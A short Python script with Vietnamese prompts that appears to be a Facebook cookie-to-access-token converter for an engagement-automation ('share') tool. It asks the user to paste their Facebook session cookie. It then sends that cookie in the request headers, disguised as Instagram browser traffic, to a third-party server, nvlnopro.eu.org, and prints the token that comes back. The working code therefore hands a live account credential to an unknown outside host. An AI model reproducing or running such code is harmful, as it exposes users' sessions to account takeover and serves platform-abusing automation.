import os
import json
from datetime import timezone, datetime, timedelta
from pystyle import Write,Colors
import requests
from time import sleep
import threading
def shareao():
    from time import sleep
    import requests,threading,os,sys
    def clear():
        if(sys.platform.startswith('win')):
            os.system('cls')
        else:
            os.system('clear')
    ck_fb = Write.Input('Nhập Cookie Cần Đổi Sang Token: ',Colors.blue_to_red,interval=0.0001)
    hed_gettoken = {
        'authority': 'www.instagram.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'cookie': ck_fb,
        'pragma': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36',
    }
    try:
        token_fb = requests.get('https://nvlnopro.eu.org/GETTOKEN.php?key=admin_auto_ngu', headers=hed_gettoken).url.split('#access_token=')[1].split('&data_access_expiration_time')[0]
        Write.Print(f'Token Của Bạn Là: {token_fb}',Colors.blue_to_red,interval=0.0001)
    except:
        Write.Print("Cookie Lỗi Rồi))",Colors.blue_to_red,interval=0.0001)
        quit()
    
shareao()
